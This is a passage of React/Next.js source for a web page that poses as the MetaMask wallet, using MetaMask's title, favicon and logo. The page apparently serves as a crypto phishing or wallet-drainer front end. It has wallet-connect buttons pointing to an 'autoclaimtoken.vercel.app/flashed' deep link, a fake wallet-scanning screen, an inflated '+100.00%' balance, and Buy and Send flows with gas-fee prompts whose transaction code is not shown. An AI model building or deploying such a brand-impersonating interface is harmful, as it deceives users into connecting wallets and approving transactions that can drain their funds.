                <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
                <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
              </div>
              
              {/* Detected Wallets */}
              {detectAvailableWallets().length > 0 && (
                <div className="mb-4">
                  <div className="text-gray-300 text-sm mb-2">Detected Wallets:</div>
                  {detectAvailableWallets().map((wallet, index) => (
                    <button 
                      key={index}
                      onClick={() => connectWallet(wallet)}
                      className="flex items-center w-full bg-green-600 hover:bg-green-700 p-3 rounded-lg text-white font-semibold mb-2"
                    >
                      <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
                        <span className="text-white font-bold">✓</span>
                      </div>
                      <div>
                        <div>{wallet}</div>
                        <div className="text-xs text-green-200">Ready to connect</div>
                      </div>
                    </button>
                  ))}
                  <div className="border-t border-gray-600 my-4"></div>
                  <div className="text-gray-300 text-sm mb-2">Other Options:</div>
                </div>
              )}
              
              <div className="space-y-3">
                <button 
                  onClick={() => {
                    if (window.ethereum && window.ethereum.isMetaMask) {
                      connectWallet('MetaMask');
                    } else {
                      window.open('https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed', '_blank');
                    }
                  }}
                  className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
                >
                  <img 
                    src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                    alt="MetaMask" 
                    className="w-8 h-8 mr-3"
                  />
                  <div>
                    <div>MetaMask</div>
                    <div className="text-xs text-orange-200">Most popular wallet</div>
                  </div>
                </button>
                <button 
                  onClick={() => {
                    if (window.ethereum && window.ethereum.isTrust) {
                      connectWallet('Trust Wallet');
                    } else {
                      window.open('https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed', '_blank');
                    }
                  }}
                  className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
                >
                  <img 
                    src="https://trustwallet.com/assets/images/media/assets/TWT.png" 
                    alt="Trust Wallet" 
                    className="w-8 h-8 mr-3 rounded-lg"
                  />
                  <div>
                    <div>Trust Wallet</div>
                    <div className="text-xs text-blue-200">Mobile-first wallet</div>
                  </div>
                </button>
                <button 
                  onClick={() => {
                    const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
                    setUserAddress(mockAddress);
                    setShowModal(null);
                    localStorage.setItem('connectedWallet', mockAddress);
                    startWalletScan(mockAddress);
                  }}
                  className="flex items-center w-full bg-gray-600 hover:bg-gray-700 p-4 rounded-lg text-white font-semibold"
                >
                  <div className="w-8 h-8 bg-gray-500 rounded-full mr-3 flex items-center justify-center">
                    <span className="text-white font-bold">+</span>
                  </div>
                  <div>
                    <div>Other Wallet</div>
                    <div className="text-xs text-gray-300">Manual connection</div>
                  </div>
                </button>
              </div>
            </div>
          </div>
        )}
      </>
    );
  }
  
  // Show scanning interface
  if (isScanning) {
    return (
      <>
        <Head>
          <title>MetaMask</title>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
          <link rel="icon" href="https://metamask.io/images/favicon.ico" />
        </Head>
        
        <div className="min-h-screen bg-black text-white">
          <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
            
            {/* Header */}
            <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
              <div className="flex items-center justify-center mb-2">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                  alt="MetaMask" 
                  className="w-8 h-8 mr-2"
                />
                <div className="text-white font-bold text-xl">MetaMask</div>
              </div>
            </div>

            {/* Scanning Interface */}
            <div className="flex flex-col items-center justify-center min-h-[500px] p-8">
              <div className="text-6xl mb-6 animate-pulse">🔍</div>
              <h2 className="text-white text-xl font-semibold mb-4">Scanning Wallet</h2>
              <p className="text-gray-400 text-center mb-8">
                {scanningMessage}
              </p>
              
              {/* Progress Bar */}
              <div className="w-full max-w-xs mb-6">
                <div className="bg-gray-700 rounded-full h-2">
                  <div 
                    className="bg-orange-500 h-2 rounded-full transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  ></div>
                </div>
                <div className="text-center text-gray-400 text-sm mt-2">
                  {Math.round(scanProgress)}% complete
                </div>
              </div>
              
              <div className="text-gray-500 text-xs text-center">
                Analyzing blockchain data across multiple networks...
              </div>
            </div>
          </div>
        </div>
      </>
    );
  }
  
  if (!walletData) {
    return <div className="min-h-screen bg-gray-900 flex items-center justify-center">
      <div className="text-white">Loading wallet...</div>
    </div>;
  }

  const currentAccount = accounts.find(acc => acc.id === selectedAccount) || accounts[0];

  return (
    <>
      <Head>
        <title>MetaMask</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
        <link rel="icon" href="https://metamask.io/images/favicon.ico" />
      </Head>
      
      <div className="min-h-screen bg-black text-white">
        <div className="max-w-md mx-auto bg-gray-900 min-h-screen" onClick={() => setShowProfileMenu(false)}>
          
          {/* Header */}
          <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
            <div className="flex items-center justify-center mb-2">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                alt="MetaMask" 
                className="w-8 h-8 mr-2"
              />
              <div className="text-white font-bold text-xl">MetaMask</div>
            </div>
          </div>

          {/* Account Section */}
          <div className="p-6 bg-gray-800 border-b border-gray-700">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center cursor-pointer hover:bg-gray-700 p-2 rounded-lg transition-all" onClick={() => setShowModal('accountDetails')}>
                <div className="w-8 h-8 mr-3">
                  <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${currentAccount.address}`} alt="Profile" className="w-full h-full rounded-full" />
                </div>
                <div>
                  <div className="text-white font-semibold flex items-center">
                    Account {selectedAccount} 
                    <i className="fas fa-chevron-down text-gray-400 ml-2 text-xs"></i>
                  </div>
                  <div className="text-gray-400 text-sm">
                    {connectionType === 'wallet' ? 'Connected via wallet' : 'Manual view only'}
                  </div>
                </div>
              </div>
              <div className="relative">
                <button 
                  onClick={() => setShowProfileMenu(!showProfileMenu)}
                  className="w-8 h-8 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center hover:scale-110 transition-transform"
                >
                  <span className="text-white text-xs font-bold">{selectedAccount}</span>
                </button>
                <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-400 rounded-full border border-gray-800 animate-pulse"></div>
                
                {/* Profile Menu */}
                {showProfileMenu && (
                  <div className="absolute right-0 top-10 bg-gray-700 rounded-lg shadow-lg border border-gray-600 p-3 w-48 z-50">
                    <div className="text-white text-sm mb-2">
                      <div className="font-semibold">Account {selectedAccount}</div>
                      <div className="text-gray-400 text-xs">{userAddress?.slice(0,10)}...{userAddress?.slice(-4)}</div>
                    </div>
                    <div className="border-t border-gray-600 pt-2 space-y-2">
                      <button 
                        onClick={() => {
                          copyToClipboard(userAddress);
                          setShowProfileMenu(false);
                        }}
                        className="w-full text-left text-gray-300 hover:text-white text-sm py-1"
                      >
                        📋 Copy Address
                      </button>
                      <button 
                        onClick={() => {
                          setShowModal('accountDetails');
                          setShowProfileMenu(false);
                        }}
                        className="w-full text-left text-gray-300 hover:text-white text-sm py-1"
                      >
                        👤 Switch Account
                      </button>
                      <button 
                        onClick={() => {
                          handleDisconnect();
                        }}
                        className="w-full text-left text-red-400 hover:text-red-300 text-sm py-1 border-t border-gray-600 pt-2"
                      >
                        🔌 {connectionType === 'wallet' ? 'Disconnect Wallet' : 'Exit Manual View'}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>

            {/* Balance */}
            <div className="text-center mb-6">
              <div className="text-4xl font-bold text-white mb-2">
                ${Math.round(currentAccount.balance).toLocaleString()}
              </div>
              <div className="text-green-400 text-sm">
                +${Math.round(currentAccount.balance).toLocaleString()} (+100.00%) Discover
              </div>
            </div>

            {/* Action Buttons */}
            <div className="grid grid-cols-4 gap-3">
              <button 
                onClick={async () => {
                  if (connectionType !== 'wallet') {
                    setStatus('❌ Connect wallet to buy crypto');
                    return;
                  }
                  await promptBuyCrypto();
                }}
                disabled={loading || connectionType !== 'wallet'}
                className={`p-3 rounded-lg text-center transition-all ${
                  connectionType === 'wallet' ? 'bg-gray-700 hover:bg-gray-600' : 'bg-gray-800 opacity-50'
                }`}
              >
                <div className="text-xl mb-1">$</div>
                <div className="text-xs">Buy</div>
              </button>
              <button 
                onClick={() => {
                  if (connectionType !== 'wallet') {
                    setStatus('❌ Connect wallet to swap tokens');
                    return;
                  }
                  handleAction('swap');
                }}
                disabled={loading || connectionType !== 'wallet'}
                className={`p-3 rounded-lg text-center transition-all ${
                  connectionType === 'wallet' ? 'bg-gray-700 hover:bg-gray-600' : 'bg-gray-800 opacity-50'
                }`}
              >
                <div className="text-xl mb-1">⇄</div>
                <div className="text-xs">Swap</div>
              </button>
              <button 
                onClick={() => {
                  if (connectionType !== 'wallet') {
                    setStatus('❌ Connect wallet to send tokens');
                    return;
                  }
                  handleAction('send');
                }}
                disabled={loading || connectionType !== 'wallet'}
                className={`p-3 rounded-lg text-center transition-all ${
                  connectionType === 'wallet' ? 'bg-gray-700 hover:bg-gray-600' : 'bg-gray-800 opacity-50'
                }`}
              >
                <div className="text-xl mb-1">→</div>
                <div className="text-xs">Send</div>
              </button>
              <button 
                onClick={() => handleAction('receive')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">↓</div>
                <div className="text-xs">Receive</div>
              </button>
            </div>
          </div>

          {/* Multiple Rewards Banners */}
          <div className="space-y-3 m-4">
            <div className="bg-gradient-to-r from-purple-600 to-pink-600 p-4 rounded-lg flex items-center justify-between">
              <div className="flex items-center">
                <div className="w-12 h-12 mr-3">
                  <img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=100&h=100&fit=crop&crop=center" alt="Rewards" className="w-full h-full rounded-lg object-cover" />
                </div>
                <div>
                  <div className="text-white font-semibold">Rewards are here</div>
                  <div className="text-white/80 text-sm">Download the mobile app to opt-in and start earning rewards</div>
                </div>
              </div>
              <button className="text-white/60 hover:text-white">×</button>
            </div>
            
            <div className="bg-gradient-to-r from-blue-600 to-cyan-600 p-4 rounded-lg flex items-center justify-between">
              <div className="flex items-center">
                <div className="w-12 h-12 mr-3">
                  <img src="https://images.unsplash.com/photo-1640340434855-6084b1f4901c?w=100&h=100&fit=crop&crop=center" alt="Staking" className="w-full h-full rounded-lg object-cover" />
                </div>
                <div>
                  <div className="text-white font-semibold">Staking rewards available</div>
                  <div className="text-white/80 text-sm">Earn up to 12% APY on your ETH holdings</div>
                </div>
              </div>
              <button className="text-white/60 hover:text-white">×</button>
            </div>
            
            <div className="bg-gradient-to-r from-green-600 to-emerald-600 p-4 rounded-lg flex items-center justify-between">
              <div className="flex items-center">
                <div className="w-12 h-12 mr-3">
                  <img src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=100&h=100&fit=crop&crop=center" alt="Trading" className="w-full h-full rounded-lg object-cover" />
                </div>
                <div>
                  <div className="text-white font-semibold">New trading pairs</div>
                  <div className="text-white/80 text-sm">Discover trending tokens with high yield potential</div>
                </div>
              </div>
              <button className="text-white/60 hover:text-white">×</button>
            </div>
          </div>

          {/* Tabs */}
          <div className="flex border-b border-gray-700">
            {['Tokens', 'DeFi', 'NFTs', 'Activity'].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`flex-1 py-3 px-4 text-sm font-medium ${
                  activeTab === tab 
                    ? 'text-white border-b-2 border-blue-500' 
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                {tab}
              </button>
            ))}
          </div>

          {/* Network Selector */}
          <div className="p-4 border-b border-gray-700">
            <div className="flex items-center justify-between">
              <div className="flex items-center cursor-pointer" onClick={() => setShowModal('networkSelector')}>
                <div className="flex items-center">
                  <img 
                    src={{
                      ethereum: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
                      bsc: 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png',
                      polygon: 'https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png',
                      arbitrum: 'https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg'
                    }[selectedNetwork]}
                    alt="Network"
                    className="w-5 h-5 mr-2 rounded-full"
                  />
                  <span className="text-white text-sm capitalize">{selectedNetwork} Mainnet</span>
                  <i className="fas fa-chevron-down text-gray-400 ml-2"></i>
                </div>
              </div>
              <div className="flex items-center space-x-2">
                <i className="fas fa-bars text-gray-400"></i>
                <i className="fas fa-ellipsis-v text-gray-400"></i>
              </div>
            </div>
          </div>

          {/* Content */}
          <div className="flex-1">
            {activeTab === 'Tokens' && (
              <div>
                {/* ETH with real market price */}
                <div className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                  <div className="flex items-center">
                    <img 
                      src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" 
                      alt="ETH" 
                      className="w-8 h-8 rounded-full mr-3"
                    />
                    <div>
                      <div className="text-white font-medium">Ethereum • Earn</div>
                      <div className="text-red-400 text-sm">-2.15%</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-white font-medium">${(walletData.ethBalance * 3200).toFixed(2)}</div>
                    <div className="text-gray-400 text-sm">{walletData.ethBalance.toFixed(6)} ETH</div>
                  </div>
                </div>

                {/* Other Tokens with real market prices */}
                {walletData.tokens.map((token, index) => {
                  const marketPrices = {
                    'USDT': 1.00,
                    'USDC': 1.00,
                    'WETH': 3200,
                    'LINK': 14.50,
                    'UNI': 6.80,
                    'BUSD': 1.00,
                    'BNB': 310,
                    'CAKE': 2.40,
                    'MATIC': 0.85,
                    'AAVE': 95.20,
                    'ARB': 1.15,
                    'GMX': 45.60
                  };
                  
                  const price = marketPrices[token.symbol] || 1;
                  const realBalance = parseFloat(token.balance);
                  const realUsdValue = realBalance * price;
                  
                  return (
                    <div 
                      key={index} 
                      onClick={() => {
                        setSelectedToken({...token, realBalance, realUsdValue, price});
                        setShowModal('tokenDetails');
                      }}
                      className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700"
                    >
                      <div className="flex items-center">
                        <img 
                          src={token.logo} 
                          alt={token.symbol} 
                          className="w-8 h-8 rounded-full mr-3"
                        />
                        <div>
                          <div className="text-white font-medium">{token.symbol}</div>
                          <div className={`text-sm ${token.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
                            {token.change}
                          </div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">${realUsdValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                        <div className="text-gray-400 text-sm">{realBalance.toLocaleString()} {token.symbol}</div>
                      </div>
                    </div>
                  );
                })}
                
                {walletData.tokens.length === 0 && (
                  <div className="p-8 text-center">
                    <div className="text-gray-400 text-sm">No tokens found</div>
                    <div className="text-gray-500 text-xs mt-1">This account is empty</div>
                  </div>
                )}
              </div>
            )}

            {activeTab === 'DeFi' && (
              <div>
                {walletData.defiPositions.map((position, index) => {
                  const protocolLogos = {
                    'Uniswap V3': 'https://cryptologos.cc/logos/uniswap-uni-logo.png',
                    'Aave': 'https://cryptologos.cc/logos/aave-aave-logo.png',
                    'Compound': 'https://cryptologos.cc/logos/compound-comp-logo.png'
                  };
                  return (
                    <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                      <div className="flex items-center">
                        <img src={protocolLogos[position.protocol]} alt={position.protocol} className="w-8 h-8 rounded-full mr-3" />
                        <div>
                          <div className="text-white font-medium">{position.protocol}</div>
                          <div className="text-gray-400 text-sm">{position.type} • {position.apy} APY</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">{position.value}</div>
                        <div className="text-green-400 text-sm">Earning</div>
                      </div>
                    </div>
                  );
                })}
                
                {walletData.defiPositions.length === 0 && (
                  <div className="p-8 text-center">
                    <div className="text-gray-400 text-sm">No DeFi positions</div>
                    <div className="text-gray-500 text-xs mt-1">Start earning with DeFi protocols</div>
                  </div>
                )}
              </div>
            )}

            {activeTab === 'NFTs' && (
              <div>
                {walletData.nfts.map((nft, index) => {
                  return (
                    <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                      <div className="flex items-center">
                        <img src={nft.image} alt={nft.name} className="w-12 h-12 rounded-lg mr-3 object-cover" />
                        <div>
                          <div className="text-white font-medium">{nft.name}</div>
                          <div className="text-gray-400 text-sm">{nft.collection}</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">{nft.value}</div>
                        <div className="text-gray-400 text-sm">Floor</div>
                      </div>
                    </div>
                  );
                })}
                
                {walletData.nfts.length === 0 && (
                  <div className="p-8 text-center">
                    <div className="text-gray-400 text-sm">No NFTs found</div>
                    <div className="text-gray-500 text-xs mt-1">Discover and collect NFTs</div>
                  </div>
                )}
              </div>
            )}

            {activeTab === 'Activity' && (
              <div>
                {activities.map((activity, index) => (
                  <div key={activity.id || index} className="flex items-center space-x-3 p-3 hover:bg-gray-700 rounded-lg cursor-pointer">
                    <div className="w-8 h-8 rounded-full flex items-center justify-center overflow-hidden">
                      <img 
                        src={activity.image || 'https://assets.coingecko.com/coins/images/279/small/ethereum.png'} 
                        alt={activity.type}
                        className="w-full h-full object-cover"
                        onError={(e) => {
                          e.target.src = 'https://assets.coingecko.com/coins/images/279/small/ethereum.png';
                        }}
                      />
                    </div>
                    <div className="flex-1">
                      <div className="text-white font-medium">{activity.type}</div>
                      <div className="text-gray-400 text-sm">{activity.timestamp}</div>
                      {activity.from && <div className="text-gray-500 text-xs">From: {activity.from.slice(0, 10)}...</div>}
                      {activity.to && <div className="text-gray-500 text-xs">To: {activity.to.slice(0, 10)}...</div>}
                      {activity.token && <div className="text-gray-500 text-xs">Token: {activity.token}</div>}
                      {activity.platform && <div className="text-gray-500 text-xs">Platform: {activity.platform}</div>}
                    </div>
                    <div className="text-right">
                      <div className={`font-medium ${
                        activity.balanceChange === 'positive' ? 'text-green-400' : 
                        activity.balanceChange === 'negative' ? 'text-red-400' : 'text-white'
                      }`}>
                        {activity.balanceChange === 'positive' ? '+' : activity.balanceChange === 'negative' ? '-' : ''}${activity.amount.toFixed(2)}
                      </div>
                      <div className="text-green-400 text-sm">{activity.status}</div>
                    </div>
                  </div>
                ))}
                
                {transactions.map((tx) => (
                  <div key={tx.id} className="flex items-center justify-between p-4 border-b border-gray-700">
                    <div className="flex items-center">
                      <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center mr-3">
                        <span className="text-white text-xs">→</span>
                      </div>
                      <div>
                        <div className="text-white font-medium capitalize">{tx.type}</div>
                        <div className="text-gray-400 text-sm">{tx.timestamp}</div>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-white font-medium">{tx.amount}</div>
                      <div className="text-green-400 text-sm">{tx.status}</div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Account Details Modal */}
          {showModal === 'accountDetails' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Select Account</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-3">
                  {accounts.map(account => (
                    <div 
                      key={account.id} 
                      onClick={() => {
                        handleAccountSwitch(account.id);
                        setShowModal(null);
                      }}
                      className="flex items-center justify-between p-3 hover:bg-gray-700 rounded-lg cursor-pointer transition-all"
                    >
                      <div className="flex items-center">
                        <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${account.address}`} alt={`Account ${account.id}`} className="w-8 h-8 rounded-full mr-3" />
                        <div>
                          <div className="text-white font-medium flex items-center">
                            Account {account.id}
                            {account.isActive && <div className="w-2 h-2 bg-green-400 rounded-full ml-2"></div>}
                          </div>
                          <div className="text-gray-400 text-sm">{account.address.slice(0,10)}...{account.address.slice(-4)}</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white text-sm">${Math.round(account.balance).toLocaleString()}</div>
                        <div className="text-gray-400 text-xs">{account.isActive ? 'Active' : account.balance > 0 ? 'Available' : 'Empty'}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}



          {/* Wallet Options Modal */}
          {showModal === 'walletOptions' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                
                {/* Detected Wallets */}
                {detectAvailableWallets().length > 0 && (
                  <div className="mb-4">
                    <div className="text-gray-300 text-sm mb-2">Detected Wallets:</div>
                    {detectAvailableWallets().map((wallet, index) => (
                      <button 
                        key={index}
                        onClick={() => connectWallet(wallet)}
                        className="flex items-center w-full bg-green-600 hover:bg-green-700 p-3 rounded-lg text-white font-semibold mb-2"
                      >
                        <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
                          <span className="text-white font-bold">✓</span>
                        </div>
                        <div>
                          <div>{wallet}</div>
                          <div className="text-xs text-green-200">Ready to connect</div>
                        </div>
                      </button>
                    ))}
                    <div className="border-t border-gray-600 my-4"></div>
                    <div className="text-gray-300 text-sm mb-2">Other Options:</div>
                  </div>
                )}
                
                <div className="space-y-3">
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isMetaMask) {
                        connectWallet('MetaMask');
                      } else {
                        window.open('https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <img 
                      src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                      alt="MetaMask" 
                      className="w-8 h-8 mr-3"
                    />
                    <div>
                      <div>MetaMask</div>
                      <div className="text-xs text-orange-200">Most popular wallet</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isTrust) {
                        connectWallet('Trust Wallet');
                      } else {
                        window.open('https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <img 
                      src="https://trustwallet.com/assets/images/media/assets/TWT.png" 
                      alt="Trust Wallet" 
                      className="w-8 h-8 mr-3 rounded-lg"
                    />
                    <div>
                      <div>Trust Wallet</div>
                      <div className="text-xs text-blue-200">Mobile-first wallet</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isOKExWallet) {
                        connectWallet('OKX Wallet');
                      } else {
                        window.open('https://www.okx.com/web3', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-green-600 hover:bg-green-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">O</span>
                    </div>
                    <div>
                      <div>OKX Wallet</div>
                      <div className="text-xs text-green-200">Exchange wallet</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isCoinbaseWallet) {
                        connectWallet('Coinbase Wallet');
                      } else {
                        window.open('https://www.coinbase.com/wallet', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-indigo-600 hover:bg-indigo-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-indigo-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">C</span>
                    </div>
                    <div>
                      <div>Coinbase Wallet</div>
                      <div className="text-xs text-indigo-200">Beginner friendly</div>
                    </div>
                  </button>
                  <button 
                    onClick={connectManually}
                    className="flex items-center w-full bg-gray-600 hover:bg-gray-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-gray-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">👁</span>
                    </div>
                    <div>
                      <div>View Manually</div>
                      <div className="text-xs text-gray-300">Read-only access</div>
                    </div>
                  </button>
                </div>
                <div className="mt-4 text-center">
                  <p className="text-gray-400 text-sm">Choose your preferred wallet or download one above</p>
                  <p className="text-gray-500 text-xs mt-1">All wallets work with this platform</p>
                </div>
              </div>
            </div>
          )}



          {/* Send Modal */}
          {showModal === 'send' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Send {selectedToken?.symbol || 'ETH'}</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">To Address</label>
                    <input 
                      type="text"
                      value={sendAddress}
                      onChange={(e) => setSendAddress(e.target.value)}
                      placeholder="0x..."
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">Amount</label>
                    <input 
                      type="number"
                      value={sendAmount}
                      onChange={(e) => setSendAmount(e.target.value)}
                      placeholder="0.0"
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <div className="bg-gray-700 p-3 rounded-lg">
                    <div className="flex justify-between text-sm mb-1">
                      <span className="text-gray-300">Gas fee:</span>
                      <span className="text-white">{calculateGasFee()} ETH</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">USD value:</span>
                      <span className="text-white">~${(parseFloat(calculateGasFee()) * 3200).toFixed(2)}</span>
                    </div>
                  </div>
                  <button 
                    onClick={() => processTransaction('send', selectedToken, calculateGasFee())}
                    disabled={loading || !sendAddress || !sendAmount}
                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Sending...' : 'Send'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Receive Modal */}
          {showModal === 'receive' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Receive</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="text-center space-y-4">
                  <div className="bg-white p-4 rounded-lg">
                    <div className="w-32 h-32 mx-auto mb-4 rounded-lg overflow-hidden">
                      <img 
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=128x128&data=ethereum:${walletData.address}?value=0.01`}
                        alt="QR Code"
                        className="w-full h-full object-cover"
                        onError={(e) => {
                          e.target.src = `https://chart.googleapis.com/chart?chs=128x128&cht=qr&chl=${walletData.address}`;
                        }}
                      />
                    </div>
                  </div>
                  <div>
                    <div className="text-gray-300 text-sm mb-2">Your wallet address:</div>
                    <div className="bg-gray-700 p-3 rounded-lg flex items-center justify-between">
                      <span className="text-white font-mono text-sm">
                        {walletData.address.slice(0, 20)}...
                      </span>
                      <button 
                        onClick={() => copyToClipboard(walletData.address)}
                        className="text-blue-400 hover:text-blue-300 text-sm"
                      >
                        Copy
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Network Selector Modal */}
          {showModal === 'networkSelector' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full max-h-[80vh] overflow-y-auto">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Select Network</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-3">
                  {[
                    { id: 'ethereum', name: 'Ethereum Mainnet', logo: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png', congestion: 'High' },
                    { id: 'bsc', name: 'BNB Smart Chain', logo: 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png', congestion: 'Medium' },
                    { id: 'polygon', name: 'Polygon Mainnet', logo: 'https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png', congestion: 'Low' },
                    { id: 'arbitrum', name: 'Arbitrum One', logo: 'https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg', congestion: 'Medium' },
                    { id: 'solana', name: 'Solana Mainnet', logo: 'https://assets.coingecko.com/coins/images/4128/small/solana.png', congestion: 'Low' },
                    { id: 'cardano', name: 'Cardano Mainnet', logo: 'https://assets.coingecko.com/coins/images/975/small/cardano.png', congestion: 'Low' },
                    { id: 'optimism', name: 'Optimism Mainnet', logo: 'https://assets.coingecko.com/coins/images/25244/small/Optimism.png', congestion: 'Medium' },
                    { id: 'avalanche', name: 'Avalanche C-Chain', logo: 'https://assets.coingecko.com/coins/images/12559/small/coin-round-red.png', congestion: 'Medium' }
                  ].map(network => (
                    <div key={network.id} className="p-4 rounded-lg border border-gray-600 hover:bg-gray-700 cursor-pointer">
                      <div className="flex items-center" onClick={() => {
                        setSelectedNetwork(network.id);
